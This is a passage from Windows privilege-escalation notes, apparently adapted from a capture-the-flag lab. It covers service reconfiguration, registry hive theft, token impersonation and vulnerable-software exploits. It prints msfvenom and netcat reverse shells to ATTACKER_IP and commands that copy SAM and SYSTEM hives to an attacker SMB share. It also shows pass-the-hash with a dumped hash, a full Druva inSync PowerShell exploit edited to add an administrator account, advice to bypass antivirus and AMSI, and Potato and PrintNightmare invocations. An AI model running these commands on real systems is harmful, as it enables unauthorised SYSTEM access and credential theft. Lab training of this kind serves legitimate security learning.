from the Sysinternals suite. The command to check for the thmservice service DACL is:

example:
```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

example:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```
then:
```
nc -lvp 4447
```

We will then transfer the reverse shell executable to the target machine and store it in for an example C:\Users\thm-unpriv\rev-svc3.exe. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:

grant permission:

example:
```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):

example:
```
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:

example:
```
C:\> sc stop THMService
C:\> sc start THMService
```
And we will receive a shell back in our attacker's machine with SYSTEM privileges:

example:
```
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

### Abusing dangerous privileges 

#### Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:
```
whoami /priv
```

A complete list of available privileges on Windows systems is available here:
```
https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
```

From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project:
```
https://github.com/gtworek/Priv2Admin
```

#### SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

for an example, this account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

![image](https://user-images.githubusercontent.com/24814781/181478320-3cbb80d5-c23e-4226-887e-4fcd986458b8.png)

Once on the command prompt, we can check our privileges with the following command:

```
whoami /priv
```
example on how it can look:
```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:
example:
```
reg save hklm\system C:\Users\THMBackup\system.hive
```
example:
```
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
example:
```
mkdir share
```
or other way of using smbserver.py etc
```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
example:
```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```
```
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket to retrieve the users' password hashes:
example:
```
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
example
```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.42.32

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

#### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route.

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

![image](https://user-images.githubusercontent.com/24814781/181480040-a70bee29-f974-470d-a9b6-159407a99437.png)

Once on the command prompt, we can check our privileges with the following command:
```
whoami /priv
```
example on how it can look:
```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

for this example we'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![image](https://user-images.githubusercontent.com/24814781/181480473-d94c149e-3122-410f-85a7-976393582355.png)

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:

example:
```
takeown /f C:\Windows\System32\Utilman.exe
```

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
example
```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

After this, we will replace utilman.exe with a copy of cmd.exe:

```
C:\Windows\System32\> copy cmd.exe utilman.exe
```

To trigger utilman, we will lock our screen from the start button:

![image](https://user-images.githubusercontent.com/24814781/181480922-fbb84d81-246d-461c-a959-75adbbdc0431.png)

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

![image](https://user-images.githubusercontent.com/24814781/181481008-57df11e4-ae7e-434f-9df4-73621d9705ce.png)

#### SeImpersonate / SeAssignPrimaryToken


These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

![image](https://user-images.githubusercontent.com/24814781/181481480-8edb0fa0-c6f4-4e2f-80da-4a6265613031.png)


There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

![image](https://user-images.githubusercontent.com/24814781/181481785-da9618aa-7e61-44ed-92b0-71918873823c.png)

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

```
https://github.com/antonioCoco/RogueWinRM
```
```
https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1
```

Let's start by an example and assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

example
"http://10.10.42.32/"

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:'

![image](https://user-images.githubusercontent.com/24814781/181482339-a261df55-e0df-4dce-bc6a-c57dde535204.png)


To use RogueWinRM, we first need to upload the exploit to the target machine. 

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:

```
nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

example:
```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![image](https://user-images.githubusercontent.com/24814781/181483423-78f2b90c-e684-4102-930f-f94a6934d4c2.png)


Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:

```
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

### Abusing vulnerable software 

#### Unpatched Software

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

```
wmic product get name,version,vendor
```

Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db:
```
https://www.exploit-db.com/
```
packet storm
```
https://packetstormsecurity.com/
```

or plain old Google, amongst many others.

Using wmic and Google, can you find a known vulnerability on any installed product?

after this its hard to give an example, search up a known exploit for any program that is vulnerable and follow it and change the source code so it works for you and will do what ever you want the payload to to or etc.

for an example we will use 
Case Study: Druva inSync 6.6.3

The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by Matteo Malvica. The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by Chris Lyne.

The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.

In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.

The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.

A patch was issued, where they decided to check that the executed command started with the string C:\ProgramData\Druva\inSync4\, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute C:\Windows\System32\cmd.exe, which is not in the allowed path; you could simply ask the server to run C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe and that would bypass the check successfully.

To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:

![image](https://user-images.githubusercontent.com/24814781/181486529-59fdd3bb-0deb-4d49-be5d-e62fe10f46f8.png)

The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.

Initially published by Matteo Malvica here:
```
https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html
```

the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:
```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

You can pop a Powershell console and paste the exploit directly to execute it. Note that the exploit's default payload, specified in the $cmd variable, will create a user named pwnd in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this example, we will change the payload to run the following command:
```
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

This will create user pwnd with a password of SimplePass123 and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user pwnd exists and is part of the administrators' group:

```
net user pwnd
```

As a last step, you can run a command prompt as administrator:

![image](https://user-images.githubusercontent.com/24814781/181487825-be4765a4-8799-48b0-9545-9340b112579d.png)
  

### Get LAPSPasswords
  
Powershell function to pull the local admin passwords from LDAP, stored there by LAPS. 

```
https://github.com/kfosaaen/Get-LAPSPasswords.git
```

### powerup
PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It is not a comprehensive check against all known privilege escalation techniques, but it is often a good place to start when you are attempting to escalate local privileges.

The script can be downloaded from here as a packet with the powersploit github under the privesc part: 
```
https://github.com/PowerShellMafia/PowerSploit
```
Brief Overview

Here is a brief overview of how to use PowerUp.ps1

1.    Download PowerUp.ps1
2.    Modify the script to bypass anti-virus
3.    Upload the file to the target Windows machine
4.    Disable AMSI and bypass PowerShell Execution Policy
```
powershell -ep bypass
```
5.    Run the program and observe the output
6.    Select the misconfiguration you want to exploit and run the provided command.

how to use it 
```
powershell -ep bypass
. .\powerup.ps
Invoke-AllChecks
```


### sweetpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```
download exe binary with:
```
wget https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe
```

Sweet Potato
Sweet Potato is a collection of various native Windows privilege escalation techniques from service accounts to SYSTEM. It has been created by @EthicalChaos and includes:

RottenPotato

Weaponized JuciyPotato with BITS WinRM discovery

PrintSpoofer discovery and original exploit

EfsRpc built on EfsPotato

PetitPotam

It is the definitelly potatoe, a potatoe to rule them all.

Exploitation
Download the binary from the repository: Here
```
https://github.com/CCob/SweetPotato
```
```
./SweetPotato.exe

  -c, --clsid=VALUE          CLSID (default BITS:
                               4991D34B-80A1-4291-83B6-3328366B9097)
  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode
                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]
  -l, --listenPort=VALUE     COM server listen port (default 6666)
  -h, --help                 Display this help
```





### JuicyPotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Juicy Potato
Juicy Potato is Rotten Potato on steroids. It allows a more flexible way to exploit the vulnerability. In this case, ohpe & decoder during a Windows build review found a setup where BITS was intentionally disabled and port 6666 was taken, therefore Rotten Potato PoC won’t work.

What are BITS and CLSID?
CLSID is a globally unique identifier that identifies a COM class object. It is an identifier like UUID.
Background Intelligent Transfer Service (BITS) is used by programmers and system administrators to download files from or upload files to HTTP web servers and SMB file shares. The point is that BITs implements the IMarshal interface and allows the proxy declaration to force the NTLM Authentication.
Rotten Potato’s PoC used BITS with a default CLSID
```
// Use a known local system service COM server, in this cast BITSv1
Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
```
They discovered that other than BITS there are several out of process COM servers identified by specific CLSIDs that could be abused. They need al least to:

Be instantiable by the current user, normally a service user which has impersonation privileges
Implement the IMarshal interface
Run as an elevated user (SYSTEM, Administrator, …)
And they found a lot of them: http://ohpe.it/juicy-potato/CLSID/

What are the advantages?
We do not need to have a meterpreter shell
We can specify our COM server listen port
We can specify with CLSID to abuse
Exploitation
Download the binary from the repository: Here
```
https://github.com/ohpe/juicy-potato
```
```
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```
Does this still works?
Same case as Rotten potato.

### hotpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```
Hot Potato
Hot Potato was the first potato and was the code name of a Windows privilege escalation technique discovered by Stephen Breen @breenmachine. This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012.

How does this works?
![image](https://user-images.githubusercontent.com/24814781/180617915-894293d4-648b-4d5e-924b-e8ed5c9f39fa.png)
  
Therefore, the vulnerability uses the following:

1. Local NBNS Spoofer: To impersonate the name resolution and force the system to download a malicious WAPD configuration.
2. Fake WPAD Proxy Server: Deploys a malicios WAPD configuration to force the system to perform a NTLM authentication
3. HTTP -> SMB NTLM Relay: Relays the WAPD NTLM token to the SMB service to create an elevated process.

Exploitation
Download the binary from the repository: Here  
```
https://github.com/foxglovesec/Potato
```
```
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
```
Is this vulnerability exploitable right now?
Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.

  
### rottenpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Rotten Potato
Rotten Potato is quite complex, but mainly it uses 3 things:

1. RPC that is running through NT AUTHORITY/SYSTEM that is going to try to authenticate to our local proxy through the CoGetInstanceFromIStorage API Call.
2. RPC in port 135 that is going to be used to reply all the request that the first RPC is performing. It is going to act as a template.
3. AcceptSecurityContext API call to locally impersonate NT AUTHORITY/SYSTEM

![image](https://user-images.githubusercontent.com/24814781/180618032-1a3b4645-5e3b-4339-8859-92cc60d39d08.png)


1. Trick RPC to authenticate to the proxy with the CoGetInstanceFromIStorage API call. In this call the proxy IP/Por t is specified.
2. RPC send a NTLM Negotiate package to the proxy.
3. The proxy relies the NTLM Negotiate to RPC in port 135, to be used as a template. At the same time, a call to AcceptSecurityContext is performed to force a local authentication. Notice that this package is modified to force the local authentication.
4. & 5. RPC 135 and AcceptSecurityContext replies with a NTLM Challenge . The content of both packets are mixed to match a local negotiation and is forwarded to the RPC, step 6..
7. RPC responds with a NLTM Auth package that is send to AcceptSecurityContext (8.) and the impersonation is performed (9.).

 
Exploitation
Download the binary from the repository: Here
```
https://github.com/breenmachine/RottenPotatoNG
```
After having a meterpreter shell with incognito mode loaded:
```
MSFRottenPotato.exe t c:\windows\temp\test.bat
```
Is this vulnerability exploitable right now?
Decoder analyzed if this technique could be exploited in the latest Windows version, in this blog post: https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/

To sum up:

DCOM does not talk to our local listeners, so no MITM and no exploit.

Sending the packets to a host under our control listening on port 135, and then forward the data to our local COM listener does not work. The problem is that in this case, the client will not negotiate a Local Authentication.

Therefore, this technique won’t work on versions >= Windows 10 1809 & Windows Server 2019

### lonelypotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Lonely Potato
Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the “incognito” module made by Decoder.

https://decoder.cloud/2017/12/23/the-lonely-potato/

Is this vulnerability exploitable right now?
Lonely Potato is deprecated and after visiting the repository, there is an indication to move to Juicy Potato.
```
https://github.com/decoder-it/lonelypotato
```
OBS: just switch to juicypotato or something else!

### roguepotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Rogue Potato
After reading fixes regarding Rotten/Juicy potato, the following conclusions can be drawn:

You cannot specify a custom port for OXID resolver address in latest Windows versions
If you redirect the OXID resolution requests to a remote server on port 135 under your control and the forward the request to your local Fake RPC server, you will obtain only an ANONYMOUS LOGON.
If you resolve the OXID Resolution request to a fake RPC Server, you will obtain an identification token during the IRemUnkown2 interface query.
How does this works?

![image](https://user-images.githubusercontent.com/24814781/180618225-24ffa2fb-bc31-4262-9929-74d6e9c157a6.png)

Rogue Potato instruct the DCOM server to perform a remote OXID query by specifying a remote IP (Attacker IP)
On the remote IP, setup a “socat” listener for redirecting the OXID resolutions requests to a fake OXID RPC Server
The fake OXID RPC server implements the ResolveOxid2 server procedure, which will point to a controlled Named Pipe [ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]].
The DCOM server will connect to the RPC server in order to perform the IRemUnkown2 interface call. By connecting to the Named Pipe, an “Autentication Callback” will be performed and we could impersonate the caller via RpcImpersonateClient() call.
Then, a token stealer will:
Get the PID of the rpcss service
Open the process, list all handles and for each handle try to duplicate it and get the handle type
If handle type is “Token” and token owner is SYSTEM, try to impersonate and launch a process with CreatProcessAsUser() or CreateProcessWithToken()

To dig deeper read the author’s blog post: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/

What do you need to make it work?
You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim
Upload both exe files from the PoC. In fact it is also possible to launch the fake OXID Resolver in standalone mode on a Windows machine under our control when the victim’s firewall won’t accept incoming connections.
More info: https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html

Exploitation
Download the binary from the repository: Here
```
https://github.com/antonioCoco/RoguePotato
```
Run in your machine the socat redirection (replace VICTIM_IP):
```
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```
Execute PoC (replace YOUR_IP and command):
```
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
```

### genericpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Generic Potato
Wait, another potato? Yes. Generic Potato is a modified version of SweetPotato by @micahvandeusen to support impersonating authentication over HTTP and/or named pipes.

This allows for local privilege escalation from SSRF and/or file writes. It is handy when:

The user we have access to has SeImpersonatePrivilege
The system doesn’t have the print service running which prevents SweetPotato.
WinRM is running preventing RogueWinRM
You don’t have outbound RPC allowed to any machine you control and the BITS service is disabled preventing RoguePotato.
How do we abuse this? All we need is to cause an application or user with higher privileges to authenticate to us over HTTP or write to our named pipe. GenericPotato will steal the token and run a command for us as the user running the web server, probably system. More information ca be found here

Exploitation
Download the binary from the repository: Here
```
https://github.com/micahvandeusen/GenericPotato
```
```
.\GenericPotato.exe

  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode [HTTP|NamedPipe(default)]
  -l, --port=VALUE           HTTP port to listen on (default 8888)
  -i, --host=VALUE           HTTP host to listen on (default 127.0.0.1)
  -h, --help                 Display this help
```

  ## printnightmare 
  CVE-2021-1675
  
  Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare) 
  
  ```
  https://github.com/calebstewart/CVE-2021-1675
  ```
  
  easy basic example: 
  ```
  Import-Module .\CVE-2021-1675.ps1
  ```
  ```
  Invoke-Nightmare
  ```
  
  and you will get a output like: 
```
  [+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

  
Notice that our payload mentions creating a new user called adm1n with a password of P@ssw0rd? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.
  
We could also take the simple option of right-clicking (if we are in a RDP GUI) on PowerShell or cmd.exe and choosing to "Run as Administrator"
  
We could also use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.
```
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```
  
Run the command "whoami /groups" in the new window. You should see "BUILTIN\Administrators" in the list of groups, and a line at the bottom of the output containing "Mandatory Label\High Mandatory Level".
  

